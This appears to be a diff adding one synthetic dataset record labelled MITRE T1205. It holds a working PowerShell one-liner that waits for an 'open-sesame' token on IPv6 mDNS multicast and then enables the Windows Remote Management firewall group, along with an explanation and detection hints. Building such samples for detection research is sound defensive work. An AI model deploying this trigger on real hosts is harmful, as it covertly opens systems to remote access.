@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$grp=[System.Net.IPAddress]::Parse('ff02::fb');$u=New-Object System.Net.Sockets.UdpClient([System.Net.Sockets.AddressFamily]::InterNetworkV6);$u.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket,[System.Net.Sockets.SocketOptionName]::ReuseAddress,$true);$u.Client.Bind([System.Net.IPEndPoint]::new([System.Net.IPAddress]::IPv6Any,5353));$u.JoinMulticastGroup($grp);$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::IPv6Any,0);while($true){$b=$u.Receive([ref]$ep);$s=[Text.Encoding]::UTF8.GetString($b);if($s -like '*open-sesame*'){& netsh advfirewall firewall set rule group=\"Windows Remote Management\" new enable=yes;break}}",
+  "explanation": "Listens on IPv6 mDNS multicast (ff02::fb, UDP/5353) for a payload containing 'open-sesame'. On match, enables the Windows Remote Management firewall group using netsh, exposing management endpoints only after receipt of a covert multicast signal. Requires elevation.",
+  "rationale_steps": [
+    "Join IPv6 mDNS multicast group and read UDP datagrams for a magic token.",
+    "Enable WinRM firewall group when the token is observed to expose remote management.",
+    "Detection: alert on unexpected UDP/5353 listeners, IPv6 multicast use on servers, and netsh-based enabling of WinRM on systems where it is usually disabled."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-3bddffbc",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
